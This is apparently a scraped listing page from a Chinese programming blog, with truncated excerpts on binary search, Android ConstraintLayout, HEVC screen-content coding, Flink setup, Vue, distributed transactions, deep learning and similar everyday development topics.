基本模板就是这样，接下来就是实践，积累经验。 目前做过的题有：704、69、34、35、153、154、33、81、4 推荐按照这个顺序做题 下面有这些题的答案（我自己写的，还有很多不足之处，欢迎讨论） leetcode[704二分查找]——常规法 题目：给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。 下面代码是用左中位法： class Solution: def search(self, nums: List[int], target: int) -&gt; int: left = 0 right = len(nums) - 1 #第一步：判断返回值是不是能超出边界，此题不会超出边界 while left &lt; right: mid = (left + right) // 2 #第二步：判断选择左中位法还是右中位法，对于有序二分法查找，选择左中位法和又中位法都可以 if nums[mid] &lt; target: #找能排除mid的逻辑 left = mid + 1 else: right = mid if nums[left] == target: #第三步，对nums[left]进行判断 return left else: return -1 704小结：这是最常规的二分法，应该熟练掌握，没什么要特别注意的。 leetcode[69.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6343be3ef632041ff8fcbb70545450c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3f25a22e394e4719dbe9a9b1a4ebdf7/" rel="bookmark">
			【约束布局】ConstraintLayout 组件可见性 View.GONE 处理 与 Margin 属性  ( 约束布局可见性处理 | goneMargin 属性 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 I . 相对定位 Margin 属性II . 可见性改变后的行为处理 ( Visibility Behavior )III . 组件设置 GONE 属性示例被 约束到不可见组件 后 Margin 属性 表现IV . goneMargin 属性示例V . 相关资源代码 I . 相对定位 Margin 属性 相对定位 Margin 简介 :
1.Margin 作用对象 : 如果某一边对应的 Margin 属性被设置 , 这些 Margin 会被应用于对应的约束 ;2.Margin 作用效果 : 设置 Margin 属性会强制在 被约束的边 ( 源边 Source Side ) 和 约束到的位置 之间 填充指定尺寸的空间 ;3.Margin 属性类型及取值范围 : Margin 属性值是尺寸类型 , 设置 dip , px 等数值属性 , 其值必须大于等于0 ;4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3f25a22e394e4719dbe9a9b1a4ebdf7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03e6770fca951615cdb8ea229de92aff/" rel="bookmark">
			提高屏幕内容图像编码质量的几个方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、屏幕内容编码背景
屏幕内容图像与传统摄像头采集到的图像有很大不同，屏幕内容图像是电子设备生成的图像，一般包括计算机图形文本、自然图像与图形文本结合的混合图像以及计算机生成的动画。摄像头采集到的图像中通常情况下都包含传感器的噪声，且色调一般连续并且纹理复杂。而屏幕内容图像不包含噪声，色调离散而颜色数少，除此之外，屏幕内容图像的线条更细腻，边缘也较为锐利，同时大部分屏幕内容图像的均匀平坦区域较多，重复图案与相同块也较多。传统的视频编码方案多采用预测+变换的混合编码结构，此编码结构对摄像头采集的自然视频图像的编码效果较好，而对于屏幕内容图像的编码效果欠佳。对于比较细的高频纹理，采用传统混合编码方式编码后会损失细节，且容易产生振铃效应，如下图1所示：
图1 屏幕内容图像采用传统混合编码方式的效果图 由于屏幕内容图像与传统视频具有显著不同的特点，我们需要寻求新的编码工具，充分挖掘屏幕内容图像本身的特征，以此来大幅度提高屏幕图像的编码效率。因此JCTVC就发布了HEVC-SCC编码器，增加了新的编码工具，大大提升了屏幕内容的编码效率。
二、HEVC-SCC关键技术介绍
HEVC-SCC于2016年正式发布，它在HEVC和HEVC-RExt的基础上，增加了新的编码工具，具体如下图2：
图2 HEVC各版本新增编码工具集
从上图可知，HEVC-SCC增加的主要工具有：
帧内块拷贝（Intra Block Copy，简称IBC）：采用当前帧已重建的块作为预测块，可以认为IBC是当前编码图像内的运动补偿；
调色板模式（Palette Mode）：调色板模式会枚举每个编码块的颜色值生成一个颜色表，并为每个样本传递一个索引以指示它属于颜色表中的哪个颜色；解码端根据规则生成一个颜色表并通过颜色表索引完成样本的重建工作。
自适应颜色变换（Adaptive Color Transform：ACT）：将残差自适应转换到不同的颜色空间，一个RGB颜色空间的图像块可以直接编码，也可以在编码时自适应转换到YCoCg颜色空间以进行编码；
自适应运动矢量分辨率（Adaptive Motion Vector Resolution：AMVR）：由于编码过程中屏幕内容图像的运动通常是像素级的，因此我们可以在slice级控制运动矢量MV的精度。
SCC编码工具集能显著提升屏幕内容编码压缩效率，这其中以IBC和Palette模式对压缩效率的提升最为明显。根据相关资料，对于屏幕内容，IBC可提升30%以上的压缩效率，加入Palette模式则可在IBC的基础上再提升15%。接下来对IBC和Palette进行详细介绍。
三、IBC模式
对于文字、图形等屏幕内容序列，同一帧中存在很多重复纹理，如图3所示，图中红色和蓝色所示区域等纹理几乎是一致的，即具有较强的空间相关性。如果在编码当前块时，可以参考当前帧已编码完的块，则能大大提高编码效率。
图3 屏幕图像空间相关性示例
针对屏幕内容图像空间相关性强的特点，屏幕内容编码引入了IBC技术。IBC技术有以下几个特点：
（1）IBC的预测块是当前编码图像帧的重建块，预测方式和帧间预测类似；
（2）IBC是在PU级进行的，可以将它看作一个帧间PU；
（3）帧间模式的设计让IBC和普通的帧间预测模式能更灵活的连接起来，比如，一个帧间编码的CU可以有两个PU，一个使用传统的帧间预测，另一个使用IBC。
IBC和传统帧间预测的区别：
（1）IBC参考的是环路滤波之前的重建像素；
（2）当前图像如果被用于参考，它会被标记为长期参考帧。当整张图像编码完后，进行环路滤波，然后加入到DPB中作为短期参考帧；
（3）IBC的预测块不能和当前CU重叠，以防止未重建好的块被用于预测；
（4）预测块和当前块应该在同一slice或tile中；
（5）预测块的搜索区域要有严格的限制，如下图4灰色区域部分，以免影响并行处理；
（6）IBC的块矢量（Block Vector）必须是整像素精度
图4 IBC搜索区域（灰色部分）
四、Palette模式
调色板模式的思想是利用CU内部的样本只是有少数几种典型的颜色组成的特性进行编码。
调色板模式的特点：
（1）对颜色数较少的编码块会有比较好的效果；
（2）将屏幕内容的颜色组成一个颜色集合，这个集合就是调色板。如图5所示，图中CU有四种颜色，编码时，对每个像素点会从颜色表中找到对应的颜色值并直接完成像素重建；解码时，通过颜色表的索引从颜色表中找到与对应像素点匹配的颜色值完成像素重建；
（3）颜色数较少时，绝大部分像素都可通过颜色表实现重建；如果颜色表中找不到与之匹配的颜色值，调色板模式会增加一个“escape”模式对找不到匹配颜色的像素点专门进行反量化操作以完成像素重建；
（4）采用颜色索引+颜色表的方式，不需要经过变换量化即可实现像素重建。
图5 CU块
IBC和Palette优势：与传统HEVC相比，在比特率相同的情况下提升了图像质量或者说图像质量相同的情况下降低了码率。
缺点：IBC和Palette只支持444格式的视频序列，编码复杂度增加，IBC编码复杂度高于Palette。
五、字典编码技术
字典编码（dictionary encoding）技术的思想是数据本身包含有重复代码这个特性。例如文本文件和光栅图像就具有这种特性。字典编码技术是一种无损压缩技术。字典编码方法共有两类。
第一类字典编码的算法是查找正在压缩的字符序列是否在以前输入的数据中出现过，然后用已经出现过的字符串代替当前字符序列中重复的部分，它的输出仅仅是指向早期出现过的字符串的“指针”。这里所指的“字典”是指用以前处理过的数据来表示编码过程中遇到的重复部分。这种编码概念如图6所示：
图6 第一类字典编码概念
第二类字典编码的算法是从输入的数据中创建一个“短语词典”，这种短语是任意字符的组合。编码过程中当遇到已经在词典中出现的“短语”时，编码器就输出这个词典中的短语的“索引号”。这个概念如图7所示：
图7 第二类字典编码概念
字典编码已经有人申请了专利，与H264标准兼容，专利名为一种与H264标准兼容的屏幕内容编码解码方法，这个方法提高了压缩率，但不确定提高了多少压缩率。
字典编码的优势：一种无损压缩的编码方法，可以提高压缩率和编码质量，复杂度没有增加。
缺点：只能对文本区域进行压缩。
字典编码技术和palette模式相似，但是字典编码技术没有进标准，说明编码效果可能没有palette好。
六、AVS2-SMCC标准中的通用串预测技术
1、通用串预测技术介绍
在AVS2-SMCC标准中，提出了对不同屏幕内容特性的区域自适应地采用一般串模式、第一受限串模式和第二受限串模式这三种CU层次的受限串模式之一对一个CU进行编解码的通用串预测（Universal String Prediction，USP）技术。一般串也称为一般受限串。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03e6770fca951615cdb8ea229de92aff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/423227a1e28aafc7b148f09011cd8145/" rel="bookmark">
			Flink单机模式安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux运行环境搭建一个单机版Flink运行环境 Flink 下载地址：Flink官网
下载Flink程序包：flink-1.8.1-bin-scala_2.11.tgz部署在Linux服务器上，然后以单机模式运行# cd flink # tar xzf flink-1.8.1-bin-scala_2.11.tgz # cd flink-1.8.1 # ./bin/start-cluster.sh 启动成功后，浏览器访问 ip:8081，即可访问Flink的web Dashboard 运行Flink自带的SocketWindowWordCount示例程序 启动新终端运行一个端口号为9000的Socker server nc -l 9000 运行SocketWindowWordCount应用程序 ./bin/flink run examples/streaming/SocketWindowWordCount.jar --port 9000 3.运行命令获取运行结果
tail -f log/flink-*-taskexecutor-*.out 输入示例
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/151f0bd69e6e0cf82388e52e225b115f/" rel="bookmark">
			Vue中Get与Post 后台接收不到参数问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.如果使用post,传递的则是对象 前台
function(){ this.$http({ url: this.$http.adornUrl("/sys/loginById"), method: "post", data: this.$http.adornData({ id: 'MTIz' }) }).then(({ data }) =&gt; { 后台 使用@RequestBody SysLoginForm form接收，或者@RequestBody HashMap&lt;String, String&gt; map
@PostMapping("/sys/loginById") public Map&lt;String, Object&gt; loginById(@RequestBody HashMap&lt;String, String&gt; map)throws IOException { 2.如果使用get,传递的是相对单个参数 前台
getDataList() { this.dataListLoading = true; this.$http({ url: this.$http.adornUrl("/flowline/doscript/list"), method: "get", params: this.$http.adornParams({ page: this.pageIndex, limit: this.pageSize, key: this.dataForm.key }) }).then(({ data }) =&gt; { 后台接收使用@RequestParam Map&lt;String, Object&gt; params
@GetMapping("/sys/loginById") public Map&lt;String, Object&gt; loginById(@RequestParam String id)throws IOException { 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/966d261caae74a86bd8c1bc422d61c34/" rel="bookmark">
			【Matlab】一行太长，使用接续符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 只需要在末尾按一下顺序加几个字符即可。先按下一个空格，再按三个点...（英文模式下的），如： ...
例子：
f = [-0.2115 -0.1978 -0.1840 -0.1701 -0.1562 -0.1422 -0.1281 -0.1140 -0.0999 -0.0857 -0.0715 ... -0.0572 -0.0429 -0.0286 -0.0143 0 0.0143 0.0286 0.0429 0.0572 0.0715 0.0857 0.0999 0.1140 ... 0.1281 0.1422 0.1562 0.1701 0.1840 0.1978 0.2115]'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15a143a57e32ef2d0a2b1a86050016ac/" rel="bookmark">
			调研 | 5种分布式事务解决方案优缺点对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景
分布式事务是企业集成中的一个技术难点，也是每一个分布式系统架构中都会涉及到的一个东西，特别是在微服务架构中，几乎可以说是无法避免。
ACID
指数据库事务正确执行的四个基本要素：
原子性（Atomicity）
一致性（Consistency）
隔离性（Isolation）
持久性（Durability）
CAP
CAP原则又称CAP定理，指的是在一个分布式系统中，一致性（Consistency）、可用性（Availability）、分区容忍性（Partition tolerance）。CAP 原则指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。
一致性：在分布式系统中的所有数据备份，在同一时刻是否同样的值。
可用性：在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。
分区容忍性：以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C和A之间做出选择。
BASE理论
BASE理论是对CAP中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性。
Basically Available（基本可用）
Soft state（软状态）
Eventually consistent（最终一致性）
解决方案
01
两阶段提交（2PC）
两阶段提交2PC是分布式事务中最强大的事务类型之一，两段提交就是分两个阶段提交，第一阶段询问各个事务数据源是否准备好，第二阶段才真正将数据提交给事务数据源。
为了保证该事务可以满足ACID，就要引入一个协调者（Cooradinator）。其他的节点被称为参与者（Participant）。协调者负责调度参与者的行为，并最终决定这些参与者是否要把事务进行提交。处理流程如下：
阶段一
a) 协调者向所有参与者发送事务内容，询问是否可以提交事务，并等待答复。
b) 各参与者执行事务操作，将 undo 和 redo 信息记入事务日志中（但不提交事务）。
c) 如参与者执行成功，给协调者反馈 yes，否则反馈 no。
阶段二
如果协调者收到了参与者的失败消息或者超时，直接给每个参与者发送回滚(rollback)消息；否则，发送提交(commit)消息。两种情况处理如下：
情况1：当所有参与者均反馈 yes，提交事务
a) 协调者向所有参与者发出正式提交事务的请求（即 commit 请求）。
b) 参与者执行 commit 请求，并释放整个事务期间占用的资源。
c) 各参与者向协调者反馈 ack(应答)完成的消息。
d) 协调者收到所有参与者反馈的 ack 消息后，即完成事务提交。
情况2：当有一个参与者反馈 no，回滚事务
a) 协调者向所有参与者发出回滚请求（即 rollback 请求）。
b) 参与者使用阶段 1 中的 undo 信息执行回滚操作，并释放整个事务期间占用的资源。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15a143a57e32ef2d0a2b1a86050016ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8782a81cc2f53e357c970fdab9dd4a9/" rel="bookmark">
			一文看懂深度学习（白话解释&#43;8个优缺点&#43;4个典型算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文首发自 easyAI - 人工智能知识库
原文地址：《一文看懂深度学习（白话解释+8个优缺点+4个典型算法）》
深度学习有很好的表现，引领了第三次人工智能的浪潮。目前大部分表现优异的应用都用到了深度学习，大红大紫的 AlphaGo 就使用到了深度学习。
本文将详细的给大家介绍深度学习的基本概念、优缺点和主流的4个典型算法。
深度学习、神经网络、机器学习、人工智能的关系 深度学习、机器学习、人工智能
简单来说：
深度学习是机器学习的一个分支(最重要的分支)机器学习是人工智能的一个分支 目前表现最好的一些应用大部分都是深度学习，正是因为深度学习的突出表现，引发了人工智能的第三次浪潮。详情可以看《人工智能的发展史——3次 AI 浪潮》
深度学习、神经网络
深度学习的概念源于人工神经网络的研究，但是并不完全等于传统神经网络。
不过在叫法上，很多深度学习算法中都会包含"神经网络"这个词，比如：卷积神经网络、循环神经网络。
所以，深度学习可以说是在传统神经网络基础上的升级，约等于神经网络。
大白话解释深度学习 看了很多版本的解释，发现李开复在《人工智能》一书中讲的是最容易理解的，所以下面直接引用他的解释：
我们以识别图片中的汉字为例。
假设深度学习要处理的信息是“水流”，而处理数据的深度学习网络是一个由管道和阀门组成的巨大水管网络。网络的入口是若干管道开口，网络的出口也是若干管道开口。这个水管网络有许多层，每一层由许多个可以控制水流流向与流量的调节阀。根据不同任务的需要，水管网络的层数、每层的调节阀数量可以有不同的变化组合。对复杂任务来说，调节阀的总数可以成千上万甚至更多。水管网络中，每一层的每个调节阀都通过水管与下一层的所有调节阀连接起来，组成一个从前到后，逐层完全连通的水流系统。
那么，计算机该如何使用这个庞大的水管网络来学习识字呢？
比如，当计算机看到一张写有“田”字的图片，就简单将组成这张图片的所有数字（在计算机里，图片的每个颜色点都是用“0”和“1”组成的数字来表示的）全都变成信息的水流，从入口灌进水管网络。
我们预先在水管网络的每个出口都插一块字牌，对应于每一个我们想让计算机认识的汉字。这时，因为输入的是“田”这个汉字，等水流流过整个水管网络，计算机就会跑到管道出口位置去看一看，是不是标记由“田”字的管道出口流出来的水流最多。如果是这样，就说明这个管道网络符合要求。如果不是这样，就调节水管网络里的每一个流量调节阀，让“田”字出口“流出”的水最多。
这下，计算机要忙一阵了，要调节那么多阀门！好在计算机的速度快，暴力的计算加上算法的优化，总是可以很快给出一个解决方案，调好所有阀门，让出口处的流量符合要求。
下一步，学习“申”字时，我们就用类似的方法，把每一张写有“申”字的图片变成一大堆数字组成的水流，灌进水管网络，看一看，是不是写有“申”字的那个管道出口流水最多，如果不是，我们还得再调整所有的阀门。这一次，要既保证刚才学过的“田”字不受影响，也要保证新的“申”字可以被正确处理。
如此反复进行，知道所有汉字对应的水流都可以按照期望的方式流过整个水管网络。这时，我们就说，这个水管网络是一个训练好的深度学习模型了。当大量汉字被这个管道网络处理，所有阀门都调节到位后，整套水管网络就可以用来识别汉字了。这时，我们可以把调节好的所有阀门都“焊死”，静候新的水流到来。
与训练时做的事情类似，未知的图片会被计算机转变成数据的水流，灌入训练好的水管网络。这时，计算机只要观察一下，哪个出水口流出来的水流最多，这张图片写的就是哪个字。
深度学习大致就是这么一个用人类的数学知识与计算机算法构建起来的整体架构，再结合尽可能多的训练数据以及计算机的大规模运算能力去调节内部参数，尽可能逼近问题目标的半理论、半经验的建模方式。
传统机器学习 VS 深度学习 传统机器学习和深度学习的相似点
在数据准备和预处理方面，两者是很相似的。
他们都可能对数据进行一些操作：
数据清洗数据标签归一化去噪降维 对于数据预处理感兴趣的可以看看《AI 数据集最常见的6大问题（附解决方案）》
传统机器学习和深度学习的核心区别
传统机器学习的特征提取主要依赖人工，针对特定简单任务的时候人工提取特征会简单有效，但是并不能通用。
深度学习的特征提取并不依靠人工，而是机器自动提取的。这也是为什么大家都说深度学习的可解释性很差，因为有时候深度学习虽然能有好的表现，但是我们并不知道他的原理是什么。
深度学习的优缺点 优点1：学习能力强
从结果来看，深度学习的表现非常好，他的学习能力非常强。
优点2：覆盖范围广，适应性好
深度学习的神经网络层数很多，宽度很广，理论上可以映射到任意函数，所以能解决很复杂的问题。
优点3：数据驱动，上限高
深度学习高度依赖数据，数据量越大，他的表现就越好。在图像识别、面部识别、NLP 等部分任务甚至已经超过了人类的表现。同时还可以通过调参进一步提高他的上限。
优点4：可移植性好
由于深度学习的优异表现，有很多框架可以使用，例如 TensorFlow、Pytorch。这些框架可以兼容很多平台。
缺点1：计算量大，便携性差
深度学习需要大量的数据很大量的算力，所以成本很高。并且现在很多应用还不适合在移动设备上使用。目前已经有很多公司和团队在研发针对便携设备的芯片。这个问题未来会得到解决。
缺点2：硬件需求高
深度学习对算力要求很高，普通的 CPU 已经无法满足深度学习的要求。主流的算力都是使用 GPU 和 TPU，所以对于硬件的要求很高，成本也很高。
缺点3：模型设计复杂
深度学习的模型设计非常复杂，需要投入大量的人力物力和时间来开发新的算法和模型。大部分人只能使用现成的模型。
缺点4：没有"人性"，容易存在偏见
由于深度学习依赖数据，并且可解释性不高。在训练数据不平衡的情况下会出现性别歧视、种族歧视等问题。
4种典型的深度学习算法 卷积神经网络 - CNN CNN 的价值：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8782a81cc2f53e357c970fdab9dd4a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2735bf30d977c81707172dd7f5d1b74a/" rel="bookmark">
			在Treeview中节点的data属性中保存记录类型及其消除的办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、保存记录类型在data指针中：
procedure TForm1.getheaditems(pp:TfrxBand;hnode:THeadTreeNode;var i:Integer;var j:Integer;var zh,tmph:Integer;var tree:TTreeView); type Trec=record text:string; left,top,width,height:Integer; end; TPRec = ^TRec; var h,lh,w,tp,lt,m,firstp:Integer; ht:THeadTreeNode; currentnode,pnode:TTreeNode; hh,ss,firsttext:string; ntrec:TPrec; begin firsttext:=hnode.Text; ht:=hnode; m:=0; while True do begin w:=ht.Width; New(ntrec); if w&gt;0 then begin hh:=ht.Text; lh:=ht.GetLevel; h:=ht.Height; if lh=1 then i:=0; //ss:='left:'+inttostr(j)+',top:'+inttostr(i)+',h:'+inttostr(h)+',w:'+inttostr(w)+',text:'+hh+',level:'+inttostr(lh); //Memo1.Lines.Add(ss); //build tree if lh=1 then currentnode:=tree.Items.Add(nil,hh) else begin pnode:=findtreeitem(tree,ht.Host.Text); currentnode:=tree.Items.AddChild(pnode,hh); end; ntrec^.text:=hh; ntrec^.Top:=i; ntrec^.Left:=j; ntrec^.Width:=w; ntrec^.Height:=h; currentnode.Data:=ntrec;//CreateMemoFun(pp,hh,'leftcolumns',baNone,nil,'',j, i, w, h); //ntrec:=TPRec(currentnode.Data); with ntrec^ do begin ss:='nodename:'+hh+',left:'+inttostr(left)+',top:'+inttostr(top)+',width:'+inttostr(width)+',height:'+inttostr(Height)+',level:'+inttostr(lh); end; Memo1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2735bf30d977c81707172dd7f5d1b74a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf1761988a9594e3b56e40d1ef75dad4/" rel="bookmark">
			【约束布局】ConstraintLayout 偏移 ( Bias ) 计算方式详解 ( 缝隙比例 | 计算公式 | 图解 | 测量图 &#43; 公式 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Bias 属性使用前提水平偏移 属性 ( app:layout_constraintHorizontal_bias )垂直偏移 属性 ( app:layout_constraintVertical_bias )代码 + 测量图 + 公式 ( 不清楚的可以对着测量图和公式变量自己算 ) 先上图 , 该图是本博客的总结 ;
Bias 属性使用前提 Bias 属性使用前提 :
1.水平方向 : 使用 app:layout_constraintHorizontal_bias 的前提 , 必须先设置水平方向的约束 , 使用 Left , Right 或者 Start , End 组合成的属性约束 , 如 : //将 被约束组件 的 左侧 约束到 目标组件 的左侧 app:layout_constraintLeft_toLeftOf //将 被约束组件 的 左侧 约束到 目标组件 的右侧 app:layout_constraintLeft_toRightOf //将 被约束组件 的 右侧 约束到 目标组件 的左侧 app:layout_constraintRight_toLeftOf //将 被约束组件 的 右侧 约束到 目标组件 的右侧 app:layout_constraintRight_toRightOf //将 被约束组件 的 开始 约束到 目标组件 的 结束 app:layout_constraintStart_toEndOf //将 被约束组件 的 开始 约束到 目标组件 的 开始 app:layout_constraintStart_toStartOf //将 被约束组件 的 结束 约束到 目标组件 的 开始 app:layout_constraintEnd_toStartOf //将 被约束组件 的 结束 约束到 目标组件 的 结束 app:layout_constraintEnd_toEndOf 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf1761988a9594e3b56e40d1ef75dad4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d29e6161632ed2425b5b8c7aa58c7bbe/" rel="bookmark">
			elementUI table宽度自适应fit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		：fit='true' 或者直接为 fit 转载于:https://www.cnblogs.com/panax/p/11239664.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d75dfbd775819bed3de1404edce7daaf/" rel="bookmark">
			asp&#43;access公众号用通用领码发码随机抽奖系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用途举例： 随机领取（举例4-8）：
一个用户发送相同指令即时领取一条记录,被领取后其他人不可领取。
注意:关注用户无差别回复，注意识别一个用户多个号码关注等现象。
注意:领取用途请勿设置成随机回复：1个奖项会被回复给多人。
举例1 激活码随机发放: 一列是指令，第二列是游戏卡密或优惠券码等内容
发送指令随机回复指令对应的多条结果之一给发送者一人。
发送者再次发送相同指定回复之前内容，该条结果也不再回复其他人。
举例2：帐号密码随机发放 一列是指令，第二列是账号密码
发送指令随机回复指令对应的多条结果之一给发送者一人。
发送者再次发送相同指定回复之前内容，该条结果也不再回复其他人。
举例3：小型抽奖类用途: 以一等奖1个二等奖2个共20人抽奖为例：一共20行,一行一等奖,两行二等奖，其他行17行内容是[未中奖]
指令列一样，比如ling，前1-20人发送指令，每人随机得到一行(条)内容，之后其他人发送提示领取已结束。
举例4：小型秒抢用途: 以一等奖1个二等奖2个：一共3行,一行一等奖,两行二等奖
指令列一样，比如qiang，前3人随机得到一等奖二等奖，之后其他人发送提示结束；
举例5：抽签分配用途: 以200学生随机分5个班为例：两百行回复内容, 各班都是40行（可自由波动）。
200位家长发送统一的指令比如fenban，各用户随机得到分班结果。
注意：关注用户无差别回复，注意识别一个用户多个号码关注现象。
规则强调：
1. 只有关注公众号的某信用户才可以发送指令：需要你有某信公众号(订阅号也可)。
2. 随机领取：用户只能领取一次（以后发送提示之前领取的号码）。
3. 本系统不验证用户信息,关注用户无区别对待。
注意事项：
1.可作为接口用于第三方平台的外接第三方接口功能，无底部菜单等其他功能；
2.用了本接口，公众号的底部菜单会失效（建议第三方接口接入本接口解决）。
3.如果自己没有服务器，可以无限期免费试用:http://add.mabida.com 。
4.提醒：建议由头脑灵活且熟练电脑操作的人操作。
比如：如果你把数据重复导入两次，你的颁奖成本可能会翻倍而超预算。
下载地址1：http://lingma.96448.cn/Ling_V190724_135420.zip
下载地址2：https://download.csdn.net/download/yujianyue/11423390 下载地址3：https://gitee.com/weivote/lingma/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96329040580a79f1b9ddd4545f71a222/" rel="bookmark">
			Prettier格式化配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTML/CSS/JS/LESS 文件的 prettier 格式化规则
{ // 使能每一种语言默认格式化规则 "[html]": { "editor.defaultFormatter": "esbenp.prettier-vscode" }, "[css]": { "editor.defaultFormatter": "esbenp.prettier-vscode" }, "[less]": { "editor.defaultFormatter": "esbenp.prettier-vscode" }, "[javascript]": { "editor.defaultFormatter": "esbenp.prettier-vscode" }, /* prettier的配置 */ "prettier.printWidth": 100, // 超过最大值换行 "prettier.tabWidth": 4, // 缩进字节数 "prettier.useTabs": false, // 缩进不使用tab，使用空格 "prettier.semi": true, // 句尾添加分号 "prettier.singleQuote": true, // 使用单引号代替双引号 "prettier.proseWrap": "preserve", // 默认值。因为使用了一些折行敏感型的渲染器（如GitHub comment）而按照markdown文本样式进行折行 "prettier.arrowParens": "avoid", // (x) =&gt; {} 箭头函数参数只有一个时是否要有小括号。avoid：省略括号 "prettier.bracketSpacing": true, // 在对象，数组括号与文字之间加空格 "{ foo: bar }"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96329040580a79f1b9ddd4545f71a222/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b815b63e3931974fe63e92134d6c643/" rel="bookmark">
			【编程题】二叉树的前序遍历（Java实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【编程题】二叉树的前序遍历（Java实现） 题目来源 leetcode第144题
https://leetcode-cn.com/problems/binary-tree-preorder-traversal/
题目描述 给定一个二叉树，返回它的 前序 遍历。
示例:
输入: [1,null,2,3]
1
2
/
3
输出: [1,2,3]
进阶: 递归算法很简单，你可以通过迭代算法完成吗？
解答 方法一 递归算法
leetcode代码
/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { List&lt;Integer&gt; list=new ArrayList&lt;&gt;(); public List&lt;Integer&gt; preorderTraversal(TreeNode root) { if(root==null)return list; list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b815b63e3931974fe63e92134d6c643/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d68017b6908e0abbb62aa84fdf7fd922/" rel="bookmark">
			当知识图谱遇上推荐系统之MKR模型（论文笔记三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Multi-Task Feature Learning for Knowledge Graph Enhanced Recommendation 类别：交替学习 将知识图谱特征学习和推荐算法视为两个分离但又相关的任务，使用多任务学习的框架进行交替学习。
1、背景 MKR是一个通用的、端对端的深度推荐框架，旨在利用知识图谱嵌入(KGE)去协助推荐任务。两个任务是相互独立的，但是由于RS中的item和KG中的entity相互联系而高度相关。整个框架可以通过交替优化两个任务来被训练，赋予了MKR在真实推荐场景中高度的灵活性和适应性。
2、问题制定 M个用户的集合 U = { u1 ,u2 ,…,uM }
N个项的集合 V = { v1 ,v2 ,…,vN }
用户-项交互矩阵 Y ∈ RM*N , yuv = 1 表示用户u参与过项v，yuv = 0 表示用户u没有参与过项v
知识图谱 G = { (h, r, t) | h, t ∈ E , r ∈ R}
Note：在许多推荐场景中，项 v ∈ V 可能和一个或多个G中的 entity相关
问题描述：给定用户-项交互矩阵Y和知识图谱G，我们要预测的是，用户 u 是否会对之前没有交互过的项v感兴趣 。
预测函数：yˆuv =F(u,v|Θ,Y,G)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d68017b6908e0abbb62aa84fdf7fd922/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b34a9bbe1479b763dfbb704ab78c7d42/" rel="bookmark">
			使用递归的优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优点：
